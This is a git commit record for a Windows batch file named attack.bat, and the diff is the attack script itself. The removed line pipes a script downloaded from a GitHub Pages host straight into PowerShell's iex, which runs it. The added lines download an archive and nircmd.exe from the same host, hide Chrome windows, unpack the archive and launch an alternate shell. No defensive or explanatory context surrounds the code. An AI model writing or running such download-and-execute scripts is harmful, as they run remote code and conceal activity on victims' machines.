e085e476bda587ac52afc068630e2b7fa51e1368
bfffggh <83696427+bfffggh@users.noreply.github.com>
2024-01-23 20:15:31 +0100

    Update attack.bat

--- attack.bat
+++ attack.bat
@@ -1,1 +1,7 @@
-@powershell -c iwr https://bfffggh.github.io/bp1|iex
+@echo off
+cd /d "%userprofile%"
+curl https://bfffggh.github.io/bp1/WinXShell_x64.7z -o wx.7z
+curl https://bfffggh.github.io/bp1/nircmd.exe -o nc.exe
+nc win hide class Chrome_WidgetWin_1
+"%ProgramFiles%\7-zip\7z.exe" x wx.7z -owx
+start "" wx\winxshell.exe
